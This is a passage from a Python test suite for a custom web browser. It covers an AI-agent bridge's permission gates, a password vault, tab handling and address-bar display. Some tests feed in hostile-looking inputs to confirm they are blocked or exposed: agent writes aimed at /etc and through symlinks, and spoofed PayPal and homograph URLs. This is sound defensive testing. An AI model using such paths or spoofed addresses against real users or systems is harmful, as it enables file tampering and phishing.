              set(_r_x220) == set(_one_x220) | set(_two_x220))
        # an xn-- key and the Unicode form match
        br.config["blockApis"] = {"xn--bcher-kva.de": ["webgl"]}
        br.config["guardGpc"] = True
        br.config["guardOff"] = {"gpc": ["xn--bcher-kva.de"]}
        check("api_blocks and guard_on match an xn-- key to the Unicode host",
              br.api_blocks("bücher.de") == ["webgl"]
              and br.guard_on("gpc", "bücher.de") is False)
        check("toggle_api_block lifts an xn-- key from the Unicode host",
              br.toggle_api_block("bücher.de", "webgl") is False
              and not br.config["blockApis"])

    # page look keys are punycode
    br.config["greyscaleSites"] = ["bücher.de"]
    br.config["scrollbarsOff"] = ["bücher.de"]
    br.config["siteFontSize"] = {"bücher.de": 20}
    _pl_x220 = br.page_look_payload()
    check("page look greyHosts, scrollbarsOff and fontSizes are punycode",
          _pl_x220["greyHosts"] == ["xn--bcher-kva.de"]
          and _pl_x220["scrollbarsOff"] == ["xn--bcher-kva.de"]
          and list(_pl_x220["fontSizes"]) == ["xn--bcher-kva.de"])

    # the translation forget entry takes the raw key
    br.config["translateRules"] = {"EN": "always", "zh-hans": "never"}
    check("forget takes a raw translate key that set_translate_rule misses",
          br.forget_translate_rule("EN") is True
          and br.forget_translate_rule("zh-hans") is True
          and not br.translate_rules())
finally:
    br.__dict__.pop("save_config", None)
    br.__dict__.pop("_private_of", None)
    for _k, _v in _old_x220.items():
        if _v is _missing_x220:
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
# ---- 221: the agent bridge gates (console clear, find, audit, groups, file paths) ----
import agent_bridge as _AB221
import os as _os221
import tempfile as _tf221

_ab221 = _AB221.AgentBridge(br)
_out221 = []
_ab221._reply = lambda conn, payload: _out221.append(payload)
_keys221 = ("bridgeLevel", "bridgeSites", "bridgeOps", "bridgeAudit",
            "downloadDir")
_save221 = {k: br.config.get(k, "__absent__") for k in _keys221}


def _ask221(req):
    del _out221[:]
    _ab221._dispatch(None, json.dumps(req).encode())
    return _out221[-1] if _out221 else {}


def _restore221():
    for k, v in _save221.items():
        if v == "__absent__":
            br.config.pop(k, None)
        else:
            br.config[k] = v


_tmp221 = _tf221.mkdtemp(prefix="t221")
_v221 = br.new_tab(url=srv.url("/twhome?t221=1"), switch=True)
H.wait_for(lambda: "/twhome" in _v221.url().toString(), 8000)
try:
    # console clear is a write: refused at read level, the log kept
    _pg221 = _v221.page()
    _had221 = list(getattr(_pg221, "console_log", []))
    try:
        _pg221.console_log = ["keep221"]
        br.config["bridgeLevel"] = "read"
        _r221 = _ask221({"op": "console", "clear": True})
        _kept221 = list(_pg221.console_log)
        _r2221 = _ask221({"op": "console"})
    finally:
        _pg221.console_log = _had221
        _restore221()
    check("read level refuses console clear and keeps the log",
          _r221.get("error") == "bridge-read-only" and _kept221 == ["keep221"]
          and _r2221.get("ok"), str((_r221, _kept221)))

    # find never returns or matches a password, card or typed value --
    # on a tab of its own (the one above had been driven by the checks
    # before it), and only once the fields are really in the page, so
    # an empty answer is not just an empty page
    _fv221 = br.new_tab(url=srv.url("/twhome?find221=1"), switch=True)
    H.wait_for(lambda: "find221" in _fv221.url().toString(), 8000)
    H.wait_for(lambda: jsq(_fv221, "document.readyState") == "complete", 8000)
    _n221 = jsq(_fv221, "(function(){var d=document.createElement('div');"
                "d.innerHTML='<input id=p221 type=password value=hunter221zz>"
                "<input id=c221 autocomplete=cc-number value=4242221card>"
                "<input id=t221 type=text value=typed221val>"
                "<input id=s221 type=submit value=Send221btn>';"
                "document.body.appendChild(d);"
                "return document.querySelectorAll('#p221,#c221,#t221,#s221')"
                ".length})()")
    _f221 = {}
    for _w221 in ("hunter221zz", "4242221card", "typed221val", "Send221btn"):
        _f221[_w221] = jsq(_fv221, _AB221._FINDTEXT_JS
                           % (_AB221._js_string(_w221), 20))
    check("find never matches or returns a password, card or typed value",
          _n221 == 4
          and all(json.loads(_f221[w] or "null") == []
                  for w in ("hunter221zz", "4242221card", "typed221val"))
          and "s221" in str(_f221["Send221btn"]), str((_n221, _f221)))
    br.close_tab(br.tabs.indexOf(_fv221), ask=False)

    # the audit log cannot be cleared by a client, and rows follow bridgeSites
    br.config["bridgeAudit"] = [
        {"t": 1, "op": "nav", "target": "https://a221.test/x",
         "answer": "run", "site": "a221.test"},
        {"t": 2, "op": "nav", "target": "https://b221.test/secret",
         "answer": "run", "site": "b221.test"}]
    _c221 = _ask221({"op": "audit", "clear": True})
    _n221 = len(br.config.get("bridgeAudit") or [])
    br.config["bridgeLevel"] = "read"
    _c2221 = _ask221({"op": "audit", "clear": True})
    br.config.pop("bridgeLevel", None)
    br.config["bridgeSites"] = ["a221.test"]
    _l221 = _ask221({"op": "audit", "limit": 100})
    br.config.pop("bridgeSites", None)
    _ab221.clear_audit()
    check("an agent cannot clear the audit; only the UI call does",
          _c221.get("ok") is False and _c2221.get("ok") is False
          and _n221 >= 2 and br.config.get("bridgeAudit") == [], str(_c221))
    check("a site-limited agent sees only its sites' audit rows",
          _l221.get("ok") and "b221.test" not in json.dumps(_l221)
          and "a221.test" in json.dumps(_l221), str(_l221))
    _restore221()

    # groups: a tab off the site list is neither moved nor listed
    br.config["bridgeSites"] = ["allowed221.example"]
    _id221 = [x for _i, x in _ab221._views() if x is _v221][0]._agent_id
    _g221 = _ask221({"op": "groups", "move": _id221, "group": "x221"})
    _gl221 = _ask221({"op": "groups"})
    _in221 = br._group_of(_v221) or ""
    _restore221()
    check("groups respects bridgeSites for move and listing",
          _g221.get("error") == "site-not-allowed" and _in221 == ""
          and _gl221.get("groups") == {}, str((_g221, _gl221, _in221)))

    # file paths, for an agent held to a site list: outside the allowed
    # folders refused, temp dir works (an agent with no list is him)
    _restore221()
    br.config["bridgeSites"] = ["127.0.0.1"]
    _bad221 = _ask221({"op": "shot", "path": "/etc/shot221.png"})
    _home221 = _ask221({"op": "shot", "path": str(_Path.home() / "x221.png")})
    _good221 = _tmp221 + "/ok221.png"
    _ok221 = _ask221({"op": "shot", "path": _good221})
    _again221 = _ask221({"op": "shot", "path": _good221})
    _ovr221 = _ask221({"op": "shot", "path": _good221, "overwrite": True})
    _os221.symlink(_good221, _tmp221 + "/ln221.png")
    _sym221 = _ask221({"op": "shot", "path": _tmp221 + "/ln221.png",
                       "overwrite": True})
    _pdf221 = _ask221({"op": "pdf", "path": "/etc/pdf221.pdf"})
    _dl221 = _ask221({"op": "download", "url": srv.url("/twhome"),
                      "path": "/etc/dl221.bin"})
    check("shot, pdf and download refuse a path outside the allowed folders",
          all(r.get("error") == "path-not-allowed"
              for r in (_bad221, _home221, _pdf221, _dl221))
          and not _Path("/etc/shot221.png").exists(), str((_bad221, _pdf221)))
    check("a shot into the temp dir works; no overwrite, no symlink",
          _ok221.get("ok") is True and _os221.path.getsize(_good221) > 0
          and _again221.get("error") == "path-not-allowed"
          and _ovr221.get("error") == "path-not-allowed"
          and _sym221.get("error") == "path-not-allowed",
          str((_ok221, _again221, _ovr221, _sym221)))

    # inside his own folder, overwrite is allowed only when asked for
    _own221 = _Path(_tmp221) / "dl"
    _own221.mkdir()
    (_own221 / "f.bin").write_bytes(b"x")
    br.config["downloadDir"] = str(_own221)
    _o1221 = _ab221._out_path({"path": str(_own221 / "f.bin")})
    _o2221 = _ab221._out_path({"path": str(_own221 / "f.bin"),
                               "overwrite": True})
    _o3221 = _ab221._out_path({"path": str(_own221 / "new.bin")})
    _restore221()
    check("inside the downloads folder overwrite needs overwrite=true",
          _o1221 is None and _o2221 and _o3221, str((_o1221, _o2221, _o3221)))
    # an agent with no site or op list writes where it is told, over an
    # old file of the same name too, but never through a symlink
    br.config.pop("bridgeSites", None)
    br.config.pop("bridgeOps", None)
    _free221 = {"path": str(_own221 / "f.bin")}
    _f1221 = _ab221._out_path(_free221)
    _f2221 = _ab221._out_path({"path": _tmp221 + "/ln221.png"})
    check("an unlimited agent keeps writing where it is told, never via a symlink",
          _f1221 and _free221.get("overwrite") is True and _f2221 is None,
          str((_f1221, _f2221)))
finally:
    _restore221()
    br.close_tab(br.tabs.indexOf(_v221), ask=False)
    import shutil as _sh221
    _sh221.rmtree(_tmp221, ignore_errors=True)

# ---- 222: private yt-dlp jobs hold the private folder; one slot per agent download ----
class _Proc222:
    def __init__(self, running):
        self.running = running
    def poll(self):
        return None if self.running else 0

_live222 = _Proc222(True)
_done222 = _Proc222(False)
B._PRIVATE_YTDLP.update({_live222, _done222})
try:
    _run222 = br._private_downloads_running()
    check("222 a running private yt-dlp job counts as a private download",
          _live222 in _run222 and _done222 not in _run222, str(_run222))
finally:
    B._PRIVATE_YTDLP.discard(_live222)
    B._PRIVATE_YTDLP.discard(_done222)

# a download ending retries the private drop (it checks for open private
# tabs itself, so calling it with private tabs open changes nothing)
_drops222 = []
br._drop_private_profile = lambda: _drops222.append(1)
_had222 = B.PRIVATE_SESSION in br.session_profiles
try:
    if not _had222:
        br.session_profiles[B.PRIVATE_SESSION] = object()

    class _Req222:
        class DownloadState:
            DownloadInProgress, DownloadCompleted, DownloadCancelled = 0, 1, 2
        def state(self):
            return 2
        def downloadFileName(self):
            return "x222.bin"
        def downloadDirectory(self):
            return "/tmp"
        def receivedBytes(self):
            return 0
        def totalBytes(self):
            return 0
    _entry222 = {"id": "x222", "state": "active", "received": 0}
    br._download_state(_Req222(), _entry222)
    check("222 a download that ends tries the private drop again",
          _drops222 == [1] and _entry222["state"] == "cancelled",
          str((_drops222, _entry222.get("state"))))
finally:
    br.__dict__.pop("_drop_private_profile", None)
    if not _had222:
        br.session_profiles.pop(B.PRIVATE_SESSION, None)
    br.downloads[:] = [d for d in br.downloads if d.get("id") != "x222"]

import inspect as _insp222
import agent_bridge as _AB222
_srcdl222 = _insp222.getsource(_AB222.AgentBridge.op_download)
check("222 each agent download has its own result slot",
      '"__agentFile_" + os.urandom(6).hex()' in _srcdl222
      and "window.__agentFile =" not in _srcdl222
      and "_dead" in _srcdl222)

# ===== thirtieth pass: the password vault (fix 223) =======================
import csv as _csv223
import io as _io223
import inspect as _inspect223
_TOTP223 = "JBSWY3DPEHPK3PXP"


def _vault223(provider=None):
    d = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
    return (B.PasswordVault(d, provider=provider) if provider
            else B.PasswordVault(d))


# PV0: a wrong key file must not let the master password wipe the vault
try:
    _d223 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
    _lk223 = B.VaultLock(_d223)
    _lk223.write({"entries": [{"id": "1"}]})
    _lk223.key_file.write_bytes(os.urandom(32))
    _lk223 = B.VaultLock(_d223)
    _before223 = _lk223.file.read_bytes()
    _res223 = _lk223.enable("a long enough pass phrase 223")
    _ok223 = (_res223 is False and _lk223.file.read_bytes() == _before223
              and _lk223.key_file.exists())
except Exception as _e223:
    _ok223 = repr(_e223)
check("PV0 a master password is not sealed over a vault the key cannot open",
      _ok223 is True, str(_ok223))

# PV1: a 1Password OTP field is found by its type and written into
try:
    _op223 = B.OnePasswordProvider.__new__(B.OnePasswordProvider)
    _entry223 = {"id": "a" * 26, "title": "t", "category": "LOGIN",
                 "fields": [{"id": "username", "value": "u"},
                            {"id": "password", "value": "p"},
                            {"id": "TOTP_9f3a", "type": "OTP",
                             "label": "one-time password",
                             "value": "otpauth://totp/x?secret=" + _TOTP223}]}
    _got223 = _op223._from_op_item(_entry223).get("totp")
    _doc223 = B.OnePasswordProvider._merged(
        _entry223, {"type": "login"},
        [{"id": "totp", "type": "OTP", "label": "totp", "value": _TOTP223}])
    _otps223 = [f for f in _doc223["fields"] if f.get("type") == "OTP"]
    _ok223 = bool(_got223) and len(_otps223) == 1
except Exception as _e223:
    _ok223, _got223 = repr(_e223), None
check("PV1 an OTP field made by the 1Password app is read and not doubled",
      _ok223 is True, str((_ok223, _got223)))


# PV2: the nameless login stays when the named save is refused
class _Lazy223:
    eager = False
    locked = False

    def __init__(self):
        self.deleted = []

    def load(self):
        return {"items": [{"id": "n1", "type": "login", "host": "a223.example",
                           "username": "", "password": "pw223",
                           "remote": True}]}

    def put(self, item):
        return None

    def delete(self, item_id):
        self.deleted.append(item_id)
        return True


try:
    _lp223 = _Lazy223()
    _pv223 = _vault223(_lp223)
    _r223 = _pv223.set_entry("a223.example", "https", "bob", "pw223")
    _ok223 = (_r223 is None and not _lp223.deleted
              and [i["id"] for i in _pv223.items()] == ["n1"])
except Exception as _e223:
    _ok223 = repr(_e223)
check("PV2 a lazy store keeps the nameless login when the named save fails",
      _ok223 is True, str(_ok223))
try:
    _pv223 = _vault223()
    _pv223.set_entry("b223.example", "https", "", "pw223")
    _fp223 = _pv223.provider
    _fp223.save = lambda data: False
    try:
        _r223 = _pv223.set_entry("b223.example", "https", "bob", "pw223")
    finally:
        _fp223.__dict__.pop("save", None)
    _ok223 = (_r223 is None and len(_pv223.items()) == 1
              and _pv223.items()[0]["username"] == "")
except Exception as _e223:
    _ok223 = repr(_e223)
check("PV2 an eager store gets the nameless login back after a refused save",
      _ok223 is True, str(_ok223))

# PV3/6/9: the page's import keeps note and 2FA, reads Bitwarden columns
try:
    _src223 = _vault223()
    _src223.add_item({"type": "login", "host": "c223.example",
                      "username": "me", "password": "=pw1",
                      "note": "my note", "totp": _TOTP223})
    _buf223 = _io223.StringIO()
    _csv223.writer(_buf223).writerows(_src223.export_rows())
    _dst223 = _vault223()
    _cnt223 = _dst223.import_csv(_buf223.getvalue())
    _row223 = _dst223.get("c223.example", "me") or {}
    _ok223 = (_cnt223 == (1, 0, 0) and _row223.get("note") == "my note"
              and _row223.get("totp") == _TOTP223
              and _row223.get("password") == "=pw1")
    # an existing login with the same password gets its missing 2FA filled in
    _dst223.get("c223.example", "me")["totp"] = ""
    _cnt2223 = _dst223.import_csv(_buf223.getvalue())
    _ok2223 = (_cnt2223 == (0, 1, 0) and
               _dst223.get("c223.example", "me")["totp"] == _TOTP223)
    # Bitwarden's CSV columns
    _bw223 = ("folder,favorite,type,name,notes,fields,reprompt,login_uri,"
              "login_username,login_password,login_totp\n"
              ",0,login,n,bw note,,0,https://d223.example/,me,bwpw,%s\n"
              % _TOTP223)
    _cnt3223 = _vault223().import_csv(_bw223)
    _v3223 = _vault223()
    _v3223.import_csv(_bw223)
    _b223 = _v3223.get("d223.example", "me") or {}
    _ok3223 = (_cnt3223 == (1, 0, 0) and _b223.get("password") == "bwpw"
               and _b223.get("note") == "bw note"
               and _b223.get("totp") == _TOTP223)
except Exception as _e223:
    _ok223 = _ok2223 = _ok3223 = repr(_e223)
check("PV3/9 the page import keeps note and 2FA from this browser's CSV",
      _ok223 is True, str(_ok223))
check("PV3/9 a same-password row still fills a missing 2FA secret",
      _ok2223 is True, str(_ok2223))
check("PV6 the page import reads Bitwarden's login_password columns",
      _ok3223 is True, str(_ok3223))

# PV4: the same Bitwarden JSON twice adds nothing
try:
    _bj223 = json.dumps({"items": [
        {"type": 1, "name": "x", "login": {"username": "u", "password": "p",
                                           "uris": [{"uri": "https://e223.example"}]}},
        {"type": 2, "name": "sn", "notes": "body"}]})
    _v4223 = _vault223()
    _v4223.import_bitwarden(_bj223)
    _v4223.import_bitwarden(_bj223)
    _ok223 = len(_v4223.items()) == 2
except Exception as _e223:
    _ok223 = repr(_e223)
check("PV4 a second Bitwarden import does not double anything",
      _ok223 is True, str(_ok223))

# PV5/8: a password is not stripped; the apostrophe goes only in our own file
try:
    _v5223 = _vault223()
    _v5223.import_rows("name,url,username,password\n"
                       "a,https://f223.example,u, pw ' \n"
                       "b,https://g223.example,u,'-abc\n")
    _f223 = _v5223.get("f223.example", "u") or {}
    _g223 = _v5223.get("g223.example", "u") or {}
    _v6223 = _vault223()
    _v6223.import_csv("name,url,username,password\n"
                      "a,https://f223.example,u, pw \n"
                      "b,https://g223.example,u,'-abc\n")
    _ok223 = (_f223.get("password") == " pw ' " and
              _g223.get("password") == "'-abc" and
              _v6223.get("f223.example", "u")["password"] == " pw " and
              _v6223.get("g223.example", "u")["password"] == "'-abc")
    _own223 = _vault223()
    _own223.import_rows("name,url,username,password,note,totp\n"
                        "b,https://h223.example,u,'-abc,,\n")
    _ok2223 = _own223.get("h223.example", "u")["password"] == "-abc"
except Exception as _e223:
    _ok223 = _ok2223 = repr(_e223)
check("PV5/8 a foreign CSV's password keeps its spaces and apostrophe",
      _ok223 is True, str(_ok223))
check("PV8 this browser's own export format still loses its apostrophe",
      _ok2223 is True, str(_ok2223))

# PV7: a refused save from the toast is reported
_saved223 = br._pw_pending
_flashes223 = []
try:
    if br.vault is not None and br.vault.provider.eager:
        br._pw_pending = {"host": "t223.example", "scheme": "https",
                          "username": "u", "password": "p"}
        br.vault.set_entry = lambda *a, **k: None
        br.flash = lambda text, ms=0: _flashes223.append(text)
        br._pw_save_pending()
finally:
    br.vault.__dict__.pop("set_entry", None)
    br.__dict__.pop("flash", None)
    br._pw_pending = _saved223
check("PV7 a refused toast save says so",
      len(_flashes223) == 1 and _flashes223[0] == br._ui_str("pwSaveFailed"),
      str(_flashes223))

# fix224: an empty imported password is not newer; rollback newest first
_src224 = __import__("inspect").getsource(B.PasswordVault)
check("224 an empty imported password does not count as a newer one",
      'newer = (bool(fresh.get("password"))' in _src224)
check("224 a refused import rolls back newest first",
      "for item, was in reversed(rollback):" in _src224)
# ---- thirty-first pass, tab lifecycle (225) ----
import inspect as _insp225

# sleep_oldest: skips only discarded tabs, goes on past protected ones
_src225 = _insp225.getsource(B.Browser.sleep_oldest)
check("TL0 sleep_oldest no longer skips frozen tabs",
      "sleeping_tabs()" not in _src225 and "Discarded" in _src225)
_tabs225 = []
_orig_sleep225 = br.sleep_tab
try:
    for _n225 in range(3):
        _tabs225.append(br.new_tab(url=B.as_qurl(srv.url("/twhome")),
                                   switch=False))
    for _i225, _v225 in enumerate(_tabs225):
        # below every other tab in the suite's window (an untouched one
        # counts as 0), so these three really are the oldest
        _v225._last_seen = -3.0 + _i225
    _tried225 = []

    def _fake_sleep225(view, on=True):
        _tried225.append(view)
        return view is not _tabs225[0]      # the oldest is protected
    br.sleep_tab = _fake_sleep225
    _got225 = br.sleep_oldest(1)
    check("TL10 sleep_oldest goes past a protected oldest tab",
          len(_got225) == 1 and _got225[0] is _tabs225[1]
          and _tried225[0] is _tabs225[0],
          str(len(_got225)))
finally:
    br.sleep_tab = _orig_sleep225
    br.__dict__.pop("sleep_tab", None)
    for _v225 in _tabs225:
        _close_if_open(_v225)

# sleep_tab / freeze_tab: protected and read back
_s225 = _insp225.getsource(B.Browser.sleep_tab)
_f225 = _insp225.getsource(B.Browser.freeze_tab)
check("TLS0/TLS3 sleep_tab and freeze_tab refuse music and agent tabs",
      "_keep_playing" in _s225 and "_agent_owned" in _s225
      and "_keep_playing" in _f225 and "_agent_owned" in _f225)
check("TL5 sleep_tab reads the lifecycle state back",
      _s225.count("lifecycleState()") >= 2)
check("TL1 game_mode records only tabs that were awake",
      "was_up" in _insp225.getsource(B.Browser.game_mode))
_v225 = br.new_tab(url=B.as_qurl(srv.url("/twhome")), switch=False)
try:
    _v225._keep_playing = True
    check("TLS3 a music tab is not slept", br.sleep_tab(_v225, True) is False
          and br.freeze_tab(_v225, True) is False)
    _v225._keep_playing = False
    _v225._agent_owned = True
    check("TLS0 an agent tab is not slept", br.sleep_tab(_v225, True) is False
          and br.freeze_tab(_v225, True) is False)
finally:
    _close_if_open(_v225)

# lazy tabs: split half, pop-out, explicit load
_p225 = br.new_tab(url=B.as_qurl(srv.url("/twhome")), switch=False,
                   lazy=True)
try:
    check("TL4 setup: tab is pending", bool(getattr(_p225, "_pending", None)))
    br.split_view(index=br.tabs.indexOf(_p225))
    check("TL4 split_view loads a pending tab",
          getattr(_p225, "_pending", None) is None)
finally:
    br.close_split()
    _close_if_open(_p225)
_p225 = br.new_tab(url=B.as_qurl(srv.url("/twhome")), switch=False,
                   lazy=True)
_mini225 = None
try:
    _mini225 = br.pop_out_tab(br.tabs.indexOf(_p225))
    check("TL7 pop_out_tab loads a pending tab",
          getattr(_p225, "_pending", None) is None)
finally:
    if _mini225 is not None:
        _mini225.close()
    _close_if_open(_p225)
_p225 = br.new_tab(url=B.as_qurl(srv.url("/twhome")), switch=False,
                   lazy=True)
try:
    _p225.load(B.as_qurl(srv.url("/timers")))
    H.wait_for(lambda: getattr(_p225, "_pending", None) is None, 4000)
    check("TL3 an explicit load clears the pending address",
          getattr(_p225, "_pending", None) is None)
finally:
    _close_if_open(_p225)

# window close / merge keep the split half, session row keeps its marks
check("TL6 closeEvent and merge_windows close the split first",
      "close_split()" in _insp225.getsource(B.Browser.closeEvent)
      and "close_split()" in _insp225.getsource(B.Browser.merge_windows))
_ss225 = _insp225.getsource(B.Browser)
check("TL9 split row saved with p/l/n/w",
      'row["n"] = split.tab_name' in _ss225
      and 'row["w"] = int(split._seen_wall)' in _ss225)

# mute travels with the tab state
_m225 = br.new_tab(url=B.as_qurl(srv.url("/twhome")), switch=False)
try:
    H.wait_for(lambda: "twhome" in _m225.url().toString(), 8000)
    br.mute_tab(br.tabs.indexOf(_m225), on=True)
    _st225 = br.tab_state(indices={br.tabs.indexOf(_m225)})
    check("TL8 tab_state carries the mute",
          bool(_st225) and _st225[0].get("m") == 1, str(_st225))
    _o225 = br.open_tab_state(_st225, lazy=True)
    try:
        check("TL8 open_tab_state applies the mute",
              bool(_o225) and _o225[0].page().isAudioMuted())
    finally:
        for _w225 in _o225:
            _close_if_open(_w225)
finally:
    _close_if_open(_m225)
# ---- 226: a bookmark lock covers its whole tree for moves and merges ----
_bm226 = list(br.bookmarks)
try:
    _a226 = br.add_bookmark_folder("A226")
    _aid226 = _a226 if isinstance(_a226, int) else (_a226 or {}).get("id")
    _b226 = br.add_bookmark_folder("B226", parent=_aid226)
    _bid226 = _b226 if isinstance(_b226, int) else (_b226 or {}).get("id")
    _l226 = br._add_link("https://lock226.example/", "L226", parent=_bid226)
    _dup226 = br._add_link("https://lock226.example/", "D226", parent=0)
    br._bookmark_by_id(_aid226)["locked"] = True
    br.move_bookmark(_l226["id"], 0, 0)
    check("226 a bookmark under a locked folder's subfolder is not moved out",
          br._bookmark_by_id(_l226["id"])["parent"] == _bid226)
    br.move_bookmark(_bid226, 0, 0)
    check("226 an unlocked folder inside a locked one is not moved out",
          br._bookmark_by_id(_bid226)["parent"] == _aid226)
    br.merge_duplicate_bookmarks()
    check("226 merging duplicates keeps the copy under the locked tree",
          br._bookmark_by_id(_l226["id"]) is not None)
finally:
    br.bookmarks[:] = _bm226
    br.save_bookmarks()

import inspect as _insp226
check("226 close unused tabs keeps a tab whose bookmark could not be made",
      "if not self.add_bookmark_url(url, row[\"title\"]):" in
      _insp226.getsource(B.Browser.close_unused_tabs))
# ---- thirty-third pass: address bar (fix227) ----
_ok_a0 = (B._strip_pasted("[::1]") == "[::1]"
          and B._strip_pasted("[2001:db8::1]") == "[2001:db8::1]"
          and B._strip_pasted("[abc]") == "abc"
          and br._resolve_typed("[::1]") == "http://[::1]")
check("AD0 a bracketed IPv6 literal is opened, not searched", _ok_a0,
      br._resolve_typed("[::1]"))

check("AD2 names on his own network are not sent for suggestions",
      not any(B.looks_like_search(t) for t in
              ("fritz.box", "nas.corp", "router.localdomain",
               "printer.home.arpa"))
      and B.looks_like_search("how to cook pasta"))

_u_a3 = B.pretty_url("https://%D0%B0pple.com@%D0%B0pple.com/")
check("AD3 the host after the @ is the one made punycode",
      _u_a3.endswith("@xn--pple-43d.com/"), _u_a3)

_p_a4 = B.bar_domain_parts("data:text/html,//paypal.com/login")
_q_a4 = B.bar_domain_parts("evil.ru/r?u=https://paypal.com/x")
check("AD4 only a real scheme splits on //",
      _p_a4[1] == "" and _q_a4[1] == "evil.ru"
      and B.bar_domain_parts("foo //paypal.com/x")[1] == "",
      str((_p_a4, _q_a4)))

check("AD5 com.io is not a public suffix, co.uk is",
      B.bar_domain_parts("https://paypal.com.io/x")[:2]
      == ("https://paypal.", "com.io")
      and B.bar_domain_parts("https://a.paypal.co.uk/x")[1] == "paypal.co.uk")

check("ADS0 an IPv6 host is highlighted whole",
      B.bar_domain_parts("http://[::1]:8080/")
      == ("http://", "[::1]", ":8080/"))

_cfg_a6 = {k: br.config.get(k) for k in ("privateEngine", "searchEngine")}
_pv_a6 = br.new_tab(url=srv.url("/twhome"), private=True)
try:
    H.wait_for(lambda: "/twhome" in _pv_a6.url().toString(), 8000)
    br.config["searchEngine"] = "google"
    br.config["privateEngine"] = "duckduckgo"
    _want_a6 = br.engine_url("duckduckgo", "javascript:x")
    br.tabs.setCurrentWidget(_pv_a6)
    _js_a6 = br._resolve_typed("javascript:x")
    _got_a6 = br.search_url_for("two words", view=_pv_a6)
    check("AD1/AD6/AD7 every search follows the private engine",
          bool(_want_a6) and _js_a6 == _want_a6
          and _got_a6 == br.engine_url("duckduckgo", "two words"),
          f"{_js_a6} {_got_a6}")
finally:
    for _k_a6, _v_a6 in _cfg_a6.items():
        if _v_a6 is None:
            br.config.pop(_k_a6, None)
        else:
            br.config[_k_a6] = _v_a6
    _close_if_open(_pv_a6)

import inspect as _insp_a8
check("ADS1 a submitted form is not rewritten into a GET",
      "NavigationTypeFormSubmitted" in _insp_a8.getsource(
          B.WebPage.acceptNavigationRequest)
      .split("rewrite_url(url)")[0][-400:])

# fix228: every two-letter country's second level, except the ones that sell names directly
check("228 com.pt keeps its owner bright, com.io stays an ordinary name",
      B.bar_domain_parts("https://paypal.evil.com.pt/login")[1] == "evil.com.pt"
      and B.bar_domain_parts("https://paypal.com.io/x")[1] == "com.io"
      and B.bar_domain_parts("https://news.bbc.co.uk/a")[1] == "bbc.co.uk",
      str([B.bar_domain_parts(u)[1] for u in (
          "https://paypal.evil.com.pt/login", "https://paypal.com.io/x",
          "https://news.bbc.co.uk/a")]))
# ---- 229: session-tied logins and per-session clear-on-exit after a crash ----
import inspect as _insp229
try:
    _v229 = br.current()
    _old_sess229 = getattr(_v229, "session", "main")
    _ent229 = {"host": "example.test", "scheme": "https", "username": "w",
               "password": "p", "session": "work", "used": 5}
    _free229 = {"host": "example.test", "scheme": "https", "username": "f",
                "password": "q", "used": 1}

    class _Vault229:
        def entries_for(self, host, scheme):
            return [_ent229, _free229]

    try:
        _v229.session = "main"
        _rows229 = br._logins_in(_Vault229().entries_for("x", "https"), _v229)
        check("229a tied login dropped in another session",
              _rows229 == [_free229], str(_rows229))
        _v229.session = "work"
        _rows229 = br._logins_in(_Vault229().entries_for("x", "https"), _v229)
        check("229b tied login kept in its session", len(_rows229) == 2)
        check("229c no view keeps only untied",
              br._logins_in([_ent229, _free229], None) == [_free229])
    finally:
        _v229.session = _old_sess229
    for _fn229 in ("_pw_entry_for", "_saved_account_names", "logins_here",
                   "_autofill", "_login_form_seen", "_account_chosen"):
        _src229 = _insp229.getsource(getattr(B.Browser, _fn229))
        check("229d %s filters by session" % _fn229,
              "_in(" in _src229 or "_logins_in" in _src229, _fn229)
    check("229e crash path reads per-session clear",
          "_crash_clear_sessions" in _insp229.getsource(B.Browser.__init__))
    _old_cfg229 = br.config.get("clearOnExit")
    try:
        br.config["clearOnExit"] = {"bank": ["cookies", "history"],
                                    "x": "bad"}
        _t229 = br._crash_clear_sessions()
        check("229f crash clear table",
              _t229 == {"bank": ["cookies", "history"]}, str(_t229))
    finally:
        if _old_cfg229 is None:
            br.config.pop("clearOnExit", None)
        else:
            br.config["clearOnExit"] = _old_cfg229
except Exception as _e229:
    check("229 tests ran", False, repr(_e229))
# ---- thirty-fifth pass, media (230) ----
import inspect as _insp230
_m230 = B.MEDIA_TOOLS2
_p230 = B.PLAY_TOOLS
_k230 = B.MEDIA_TOOLS
_keys = _p230["keystrokes"]
check("MD7 keystrokes overlay skips password fields",
      "password" in _keys and "secret(e)" in _keys)
check("MD7 keystrokes off removes its listeners",
      _keys.count("removeEventListener") == 2 and "__keyHandlers" in _keys)
check("MD0 skip-silence reuses the element's source node",
      "m.__mediaSrc" in _m230["skipsilence"]
      and "m.__mediaSrc" in _m230["audiochain"])
check("MD0 skip-silence off disconnects its tap",
      "tap.from.disconnect" in _m230["skipsilence"])
check("MD1 audio chain and skip-silence check the origin and resume",
      all("location.origin" in _m230[n] and "ctx.resume()" in _m230[n]
          for n in ("skipsilence", "audiochain")))
check("MD2 noautonext off removes its listener and flag",
      "removeEventListener" in _k230["noautonext"]
      and "noAutoNext" in _k230["noautonext"])
check("MD3 captions touch only subtitle and caption tracks",
      '"subtitles"' in _m230["captions"] and '"subtitles"' in _m230["cues"])
check("MD4 zoom reset removes the inline overrides",
      'removeProperty("object-fit")' in _m230["zoom"])
check("MD5 twitch ads off only restores during an ad",
      "window.__twInAd" in _p230["twitchads"].split("return \"off\"")[0])
check("MD6 twitch theatre is not clicked when already on",
      "already" in _p230["theater"].split("twitch.tv")[1])
check("MD8 closeEvent stops captions",
      "live_captions(False)" in _insp230.getsource(B.Browser.closeEvent))
check("MD9 stale paused tab does not shadow a playing one",
      "recentlyAudible" in _insp230.getsource(B.Browser._audible_anywhere))
check("MDS0 pause mark is cleared on play",
      '"play"' in _k230["pauseall"])
check("MDS2 failed recorder is cleaned up",
      "errorOccurred" in _insp230.getsource(B.Browser._caption_tick))
check("MDS3 no online translator is guessed",
      "translate-shell" not in _insp230.getsource(B.Browser.caption_tools))

# fix231: a closed shadow root counts as secret; the autonav switch is put back without a player
_src231 = (_Path(B.__file__)).read_text()
check("231 keystrokes treat focus in a closed shadow root as a secret",
      'focus.tagName.indexOf("-") > 0' in _src231 and "!focus.shadowRoot) return true;" in _src231)
check("231 noautonext remembers the switch it turned off even with no player",
      "window.__noAutoNext = (kept.el || kept.toggled) ? kept : null;" in _src231)
# ---- review 232: reader mark, reading place on close, translator language, undo, pdf places, selection reader, line numbers ----
import inspect as _insp232

_rs232 = B.READER_TOOLS["reader"]
check("232 reader clears the article mark off and on",
